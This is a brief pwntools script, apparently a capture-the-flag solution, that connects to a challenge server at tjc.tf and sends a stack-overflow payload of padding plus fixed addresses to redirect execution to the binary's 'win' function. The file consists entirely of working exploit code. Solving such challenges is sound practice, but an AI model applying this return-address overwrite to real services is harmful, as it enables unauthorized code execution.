from pwn import *

libc = ELF('./libc.so.6')
context.binary = exe = ELF('./out')

# io = process()
# gdb.attach(io, api=True)
io = remote('tjc.tf', 31080)

io.recvuntil(b'> ')
payload = b'i'*18
payload += p64(0x401284)
payload += p64(0x1)
payload += p64(0x000000000040101a)
payload += p64(exe.sym['win'])
io.sendline(payload)
io.interactive()